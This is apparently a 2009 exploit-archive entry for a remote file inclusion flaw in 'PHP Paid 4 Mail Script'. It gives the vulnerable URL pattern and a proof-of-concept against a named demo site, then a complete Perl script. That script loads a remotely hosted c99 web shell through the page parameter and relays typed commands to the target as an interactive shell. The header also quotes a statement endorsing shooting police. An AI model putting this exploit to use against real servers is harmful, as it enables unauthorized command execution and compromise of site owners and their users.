#_______         ___________
#\   _  \ ___  __\_   _____/
#/  /_\  \\  \/  /|    __)  
#\  \_/   \>    < |     \   
# \_____  /__/\_ \\___  /   
#       \/      \/    \/    
#                       #ruling the web since 9/2008
#
#
#  [=] PHP Paid 4 Mail Script File Inclusion vuln
#       
#       Vendor   : http://www.shop-020.de
#       Script   : PHP Paid 4 Mail Script 
#       Download : http://www.shop-020.de/phpscriptat-p25h4s5-PHP-Paid-4-Mail-Scri.html
#       Author   : int_main();
#       Contact  : someone[at]jabber.ccc.de
#       Site     : 0xFEE1DEAD.de
#       Greez    : BrainWash,Thunderbird,STEAL,The Papst,eddy14,MagicFridge,Patrick B,Hero,tmh,Lorenz,iNs
#      
#
#
#       Exploit:
#
#       http://[target]/home.php?page=[evilscript]
#
#       POC:
#
#       http://www.city-demo.at/mail/home.php?page=http://google.de
#
#       (File access is unfortunately disabled in this case, otherwise, this inclusion would work because of the coding gap.)
#
#       Have phun, wui!
#
#  [=]     
#       "Wir sagen natÃ¼rlich, die Bullen sind Schweine, wir sagen, der Typ in Uniform ist ein Schwein, das ist kein Mensch, (...) 
#       und natÃ¼rlich kann geschossen werden!" (Ulrike Meinhof, 1970)" 
#  [=] 
#
# milw0rm.com [2009-07-27]


use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] PHP Paid 4 Mail Script File Inclusion Exploit (II)\n\n";
	print "[x] Author: int_main()\n";
	print "[x] Email: someone[at]jabber.ccc.de\n";
	print "[x] Website: 0xFEE1DEAD.de\n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/home.php?page=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

